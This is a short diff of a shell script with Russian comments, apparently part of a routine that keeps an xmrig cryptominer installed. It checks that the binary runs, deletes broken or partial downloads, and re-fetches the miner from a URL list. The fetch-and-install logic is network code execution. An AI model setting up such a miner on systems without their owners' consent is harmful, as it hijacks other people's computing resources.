@@ -123,7 +123,7 @@ fi
 # бинарь должен реально запускаться: обрезанная докачка даёт ELF-заголовок и SIGSEGV
 if [ -x "$D/xmrig" ] && ! "$D/xmrig" --version >/dev/null 2>&1; then
   kf_log "бинарь не запускается (обрезан или чужая арх) — качаем заново"
-  rm -f "$D/xmrig" "$D/.bin.tag" 2>/dev/null
+  rm -f "$D/xmrig" "$D/xmrig.part" "$D/.bin.tag" 2>/dev/null
   if kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS; then
     printf '%s' "$KF_BIN_TAG" > "$D/.bin.tag" 2>/dev/null
   fi
